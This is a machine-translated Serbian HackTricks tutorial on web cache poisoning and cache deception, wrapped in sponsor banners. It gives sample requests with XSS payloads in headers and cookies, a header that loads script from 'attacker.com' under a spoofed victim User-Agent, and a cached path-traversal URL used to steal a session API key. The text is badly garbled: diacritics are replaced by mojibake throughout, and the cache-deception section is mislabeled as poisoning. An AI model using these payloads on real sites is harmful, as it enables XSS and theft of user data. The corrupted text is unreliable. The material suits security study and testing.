# Trovanje ke코a i prevara ke코a

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodi캜nu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=cache-deception) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=cache-deception" %}

## Razlika

> **Koja je razlika izme캠u trovanja ke코a veb stranica i prevare ke코a veb stranica?**
>
> * U **trovanju ke코a veb stranica**, napada캜 uzrokuje da aplikacija sa캜uva zlonamerni sadr쬬j u ke코u, a ovaj sadr쬬j se servira iz ke코a drugim korisnicima aplikacije.
> * U **prevari ke코a veb stranica**, napada캜 uzrokuje da aplikacija sa캜uva osetljiv sadr쬬j koji pripada drugom korisniku u ke코u, a zatim napada캜 preuzima taj sadr쬬j iz ke코a.

## Trovanje ke코a

Trovanje ke코a ima za cilj manipulisanje ke코om na strani klijenta kako bi se naterali klijenti da u캜itavaju resurse koji su neo캜ekivani, delimi캜ni ili pod kontrolom napada캜a. Obim uticaja zavisi od popularnosti pogo캠ene stranice, jer zaga캠eni odgovor se servira isklju캜ivo korisnicima koji pose캖uju stranicu tokom perioda zaga캠enja ke코a.

Izvo캠enje napada trovanja ke코a uklju캜uje nekoliko koraka:

1. **Identifikacija neindeksiranih ulaza**: To su parametri koji, iako nisu potrebni da bi zahtev bio ke코iran, mogu promeniti odgovor koji vra캖a server. Identifikacija ovih ulaza je klju캜na jer se mogu iskoristiti za manipulaciju ke코om.
2. **Iskori코캖avanje neindeksiranih ulaza**: Nakon identifikacije neindeksiranih ulaza, slede캖i korak je saznati kako zloupotrebiti ove parametre kako bi se izmenio odgovor servera na na캜in koji koristi napada캜u.
3. **Osiguravanje da je zaga캠eni odgovor ke코iran**: Poslednji korak je osigurati da je manipulisani odgovor sa캜uvan u ke코u. Na ovaj na캜in, svaki korisnik koji pristupa pogo캠enoj stranici dok je ke코 zaga캠en 캖e dobiti zaga캠eni odgovor.

### Otkrivanje: Provera HTTP zaglavlja

Obi캜no, kada je odgovor **sa캜uvan u ke코u**, postoji **zaglavlje koje to pokazuje**, mo쬰te proveriti na koja zaglavlja treba da obratite pa쬹ju u ovom postu: [**HTTP zaglavlja ke코a**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Otkrivanje: Ke코iranje gre코aka&#x20;

Ako sumnjate da se odgovor 캜uva u ke코u, mo쬰te poku코ati **slati zahteve sa lo코im zaglavljima**, na koje bi trebalo da se odgovori sa **status kodom 400**. Zatim poku코ajte da pristupite zahtevu na uobi캜ajen na캜in i ako je **odgovor status kod 400**, znate da je ranjiv (i 캜ak biste mogli izvesti DoS).

Mo쬰te prona캖i vi코e opcija u:

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

Me캠utim, imajte na umu da **ponekad ovi tipovi status kodova nisu ke코irani** pa ovaj test mo쬯a ne캖e biti pouzdan.

### Otkrivanje: Identifikacija i procena neindeksiranih ulaza

Mo쬰te koristiti [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) da **bruteforce parametre i zaglavlja** koji mogu **promeniti odgovor stranice**. Na primer, stranica mo쬰 koristiti zaglavlje `X-Forwarded-For` da bi pokazala klijentu da u캜ita skriptu odatle:
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Izazovite 코tetan odgovor od serverske strane

Sa identifikovanim parametrom/headerom proverite kako se **filtrira** i **gde** se **odra쬬va** ili uti캜e na odgovor iz headera. Mo쬰te li ga zloupotrebiti na bilo koji na캜in (izvr코iti XSS ili u캜itati JS kod koji kontroli코ete? izvr코iti DoS?...)

### Dobijanje ke코iranog odgovora

Kada ste **identifikovali** **stranicu** koja mo쬰 biti zloupotrebljena, koji **parametar**/**header** koristiti i **kako** ga **zloupotrebiti**, trebate dobiti ke코iranu stranicu. Zavisno od resursa koji poku코avate dobiti u ke코u, ovo mo쬰 potrajati neko vreme, mo쬯a 캖ete morati poku코avati nekoliko sekundi.\
Header **`X-Cache`** u odgovoru mo쬰 biti veoma koristan jer mo쬰 imati vrednost **`miss`** kada zahtev nije bio ke코iran i vrednost **`hit`** kada je ke코iran.\
Header **`Cache-Control`** je tako캠e interesantan kako biste znali da li se resurs ke코ira i kada 캖e slede캖i put resurs ponovo biti ke코iran: `Cache-Control: public, max-age=1800`\
Jo코 jedan interesantan header je **`Vary`**. Ovaj header se 캜esto koristi da **ukazuje na dodatne headere** koji se tretiraju kao **deo klju캜a ke코a** 캜ak i ako obi캜no nisu klju캜ni. Stoga, ako korisnik zna `User-Agent` rtve koju cilja, mo쬰 otrovati ke코 za korisnike koji koriste taj specifi캜an `User-Agent`.\
Jo코 jedan header koji se odnosi na ke코 je **`Age`**. Defini코e vreme u sekundama koliko je objekat bio u ke코u proxy servera.

Prilikom ke코iranja zahteva, budite **oprezni sa headerima koje koristite** jer neki od njih mogu biti **neo캜ekivano kori코캖eni** kao **klju캜ni** i rtva 캖e morati koristiti isti header. Uvek **testirajte** Trovanje Ke코a sa **razli캜itim pregleda캜ima** da biste proverili da li radi.

## Primeri eksploatacije

### Najjednostavniji primer

Header poput `X-Forwarded-For` se odra쬬va u odgovoru nefiltrirano.\
Mo쬰te poslati osnovni XSS payload i otrovati ke코 tako da 캖e svako ko pristupi stranici biti izlo쬰n XSS napadu:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Napomena da 캖e se zahtev otrovati za `/en?region=uk` a ne za `/en`_

### Trovanje ke코a za DoS

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

### Kori코캖enje trovanja ke코a na vebu za iskori코캖avanje ranjivosti u rukovanju kola캜i캖ima

Kola캜i캖i tako캠e mogu biti reflektovani u odgovoru stranice. Ako mo쬰te zloupotrebiti to da izazovete XSS na primer, mo쬰te iskoristiti XSS u nekoliko klijenata koji u캜itavaju zlonamerni ke코 odgovor.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Napomena da 캖e, ako je ranjivi kola캜i캖 veoma kori코캖en od strane korisnika, redovni zahtevi 캜istiti ke코.

### Trovanje ke코a sa prolazom putanje za kra캠u API klju캜a <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Ovaj tekst obja코njava**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) kako je bilo mogu캖e ukrasti OpenAI API klju캜 sa URL-om poput `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` jer 캖e sve 코to odgovara `/share/*` biti ke코irano bez normalizacije URL-a od strane Cloudflare-a, 코to je ura캠eno kada je zahtev stigao do veb servera.

### Kori코캖enje vi코e zaglavlja za iskori코캖avanje ranjivosti trovanja ke코a na vebu <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Ponekad 캖e vam biti potrebno **iskoristiti nekoliko neindeksiranih ulaza** kako biste mogli zloupotrebiti ke코. Na primer, mo쬰te prona캖i **Otvoreno preusmeravanje** ako postavite `X-Forwarded-Host` na domen koji kontroli코ete i `X-Forwarded-Scheme` na `http`. **Ako** je **server** **prosle캠ivao** sve **HTTP** zahteve **na HTTPS** i koristio zaglavlje `X-Forwarded-Scheme` kao ime domena za preusmeravanje. Mo쬰te kontrolisati gde 캖e stranica biti usmerena preusmeravanjem.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Iskori코캖avanje sa ograni캜enim `Vary` zaglavljem

Ako ste otkrili da se zaglavlje **`X-Host`** koristi kao **ime domena za u캜itavanje JS resursa** ali da **`Vary`** zaglavlje u odgovoru ukazuje na **`User-Agent`**. Zatim, trebate prona캖i na캜in da eksfiltrirate User-Agent rtve i otrovate ke코 koriste캖i taj korisni캜ki agent:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Po코aljite GET zahtev sa zahtevom u URL-u i u telu. Ako web server koristi onaj iz tela, ali cache server ke코ira onaj iz URL-a, svako ko pristupi tom URL-u zapravo 캖e koristiti parametar iz tela. Kao ranjivost koju je D쬰jms Ketl prona코ao na Github veb sajtu:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
### Parametarsko prikrivanje

Na primer, mogu캖e je razdvojiti **parametre** u rubi serverima koriste캖i karakter **`;`** umesto **`&`**. Ovo se mo쬰 koristiti da se neindeksirane vrednosti parametara stave unutar indeksiranih i zloupotrebe istih.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Zloupotreba HTTP ke코 trovanja zloupotrebom HTTP zahteva za krijum캜arenje

Saznajte ovde kako izvesti [napade ke코 trovanja zloupotrebom HTTP zahteva za krijum캜arenje](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automatizovano testiranje za trovanje ke코a veb stranica

Alatka za skeniranje ranjivosti ke코a veb stranica mo쬰 se koristiti za automatsko testiranje trovanja ke코a veb stranica. Podr쬬va mnoge razli캜ite tehnike i visoko je prilagodljiva.

Primer kori코캖enja: `wcvs -u example.com`



<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=cache-deception) da lako kreirate i **automatizujete radne tokove** pokretane najnaprednijim alatkama zajednice na svetu.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=cache-deception" %}



## Ranjivi primeri

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS je prosle캠ivao fragment unutar URL-a bez uklanjanja istog i generisao ke코 klju캜 koriste캖i samo host, putanju i upit (ignori코u캖i fragment). Dakle, zahtev `/#/../?r=javascript:alert(1)` je poslat backend-u kao `/#/../?r=javascript:alert(1)` i ke코 klju캜 nije sadr쬬vao payload unutar sebe, ve캖 samo host, putanju i upit.

### GitHub CP-DoS

Slanje lo코e vrednosti u zaglavlju content-type pokrenulo je ke코iran odgovor 405. Ke코 klju캜 je sadr쬬vao kola캜i캖 tako da je bilo mogu캖e napasti samo neautentifikovane korisnike.

### GitLab + GCP CP-DoS

GitLab koristi GCP buckete za skladi코tenje stati캜kog sadr쬬ja. **GCP Bucketi** podr쬬vaju **zaglavlje `x-http-method-override`**. Tako je bilo mogu캖e poslati zaglavlje `x-http-method-override: HEAD` i otrovati ke코 tako da vrati prazno telo odgovora. Tako캠e je mogao podr쬬vati metod `PURGE`.

### Rack Middleware (Ruby on Rails)

U Ruby on Rails aplikacijama 캜esto se koristi Rack middleware. Svrsishodnost Rack koda je da uzme vrednost zaglavlja **`x-forwarded-scheme`** i postavi je kao 코emu zahteva. Kada se po코alje zaglavlje `x-forwarded-scheme: http`, dolazi do 301 preusmerenja na istu lokaciju, 코to potencijalno mo쬰 izazvati DoS na tom resursu. Dodatno, aplikacija mo쬰 prepoznati zaglavlje `X-forwarded-host` i preusmeriti korisnike na odre캠eni host. Ovo pona코anje mo쬰 dovesti do u캜itavanja JavaScript fajlova sa servera napada캜a, 코to predstavlja sigurnosni rizik.

### 403 i skladi코ni bucketi

Ranije je Cloudflare ke코irao 403 odgovore. Poku코aj pristupa S3 ili Azure Storage Blobs sa neispravnim autorizacionim zaglavljima rezultovao bi 403 odgovorom koji bi bio ke코iran. Iako je Cloudflare prestao sa ke코iranjem 403 odgovora, ovo pona코anje mo쬰 jo코 uvek biti prisutno u drugim proxy servisima.

### Umetanje indeksiranih parametara

Ke코evi 캜esto uklju캜uju odre캠ene GET parametre u ke코 klju캜. Na primer, Fastly-jev Varnish je ke코irao `size` parametar u zahtevima. Me캠utim, ako je URL enkodirana verzija parametra poslata sa pogre코nom vredno코캖u (npr. `siz%65`), ke코 klju캜 bi bio konstruisan koriste캖i ispravan `size` parametar. Ipak, backend bi obradio vrednost u URL enkodiranom parametru. URL enkodiranje drugog `size` parametra dovelo je do njegovog izostavljanja iz ke코a, ali njegove upotrebe od strane backend-a. Dodeljivanje vrednosti 0 ovom parametru rezultiralo je ke코iranjem gre코ke 400 Bad Request.

### Pravila korisni캜kog agenta

Neki programeri blokiraju zahteve sa korisni캜kim agentima koji se podudaraju sa onima visokoprometnih alatki poput FFUF ili Nuclei radi upravljanja optere캖enjem servera. Ironi캜no, ovaj pristup mo쬰 uvesti ranjivosti poput trovanja ke코a i DoS-a.

### Nelegalna zaglavlja

[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) specificira prihvatljive karaktere u imenima zaglavlja. Zaglavlja koja sadr쬰 karaktere van navedenog opsega **tchar** idealno bi trebala pokrenuti odgovor 400 Bad Request. U praksi, serveri se ne pridr쬬vaju uvek ovog standarda. Zna캜ajan primer je Akamai, koji prosle캠uje zaglavlja sa neva쬰캖im karakterima i ke코ira svaku 400 gre코ku, sve dok zaglavlje `cache-control` nije prisutno. Identifikovan je iskoristiv obrazac gde slanje zaglavlja sa neva쬰캖im karakterom, poput `\`, rezultuje ke코iranom gre코kom 400 Bad Request.

### Pronala쬰nje novih zaglavlja

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Trovanje ke코a

Cilj trovanja ke코a je da klijenti **u캜itaju resurse koji 캖e biti sa캜uvani u ke코u sa njihovim osetljivim informacijama**.

Pre svega, napomenimo da su **ekstenzije** poput `.css`, `.js`, `.png` itd. obi캜no **konfigurisane** da se **sa캜uvaju** u **ke코u**. Dakle, ako pristupite `www.example.com/profile.php/nonexistent.js`, ke코 캖e verovatno sa캜uvati odgovor jer vidi ekstenziju `.js`. Me캠utim, ako **aplikacija** ponavlja sa **osetljivim** korisni캜kim sadr쬬jima sa캜uvanim u _www.example.com/profile.php_, mo쬰te **ukrasti** te sadr쬬je od drugih korisnika.

Drugi testovi:

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _Koristite manje poznate ekstenzije poput_ `.avif`

Jo코 jedan veoma jasan primer mo쬰 se na캖i u ovom izve코taju: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
U primeru je obja코njeno da ako u캜itate nepostoje캖u stranicu poput _http://www.example.com/home.php/non-existent.css_, sadr쬬j _http://www.example.com/home.php_ (**sa osetljivim informacijama korisnika**) 캖e biti vra캖en i ke코 server 캖e sa캜uvati rezultat.\
Zatim, **napada캜** mo쬰 pristupiti _http://www.example.com/home.php/non-existent.css_ u svom pregleda캜u i posmatrati **poverljive informacije** korisnika koji su pristupili prethodno.

Imajte na umu da bi **ke코 proxy** trebalo da bude **konfigurisan** da **ke코ira** fajlove **na osnovu** ekstenzije fajla (_.css_) a ne na osnovu tipa sadr쬬ja. U primeru _http://www.example.com/home.php/non-existent.css_ 캖e imati `text/html` tip sadr쬬ja umesto `text/css` MIME tipa (코to se o캜ekuje za _.css_ fajl).

Saznajte ovde kako izvesti [napade trovanja ke코a zloupotrebom HTTP zahteva za krijum캜arenje](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception).
## Automatski alati

* [**toxicache**](https://github.com/xhzeem/toxicache): Golang skener za pronala쬰nje ranjivosti otrovanja ke코a na vebu u listi URL-ova i testiranje vi코e tehnika ubacivanja.

## Reference

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
* [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=cache-deception) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=cache-deception" %}

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
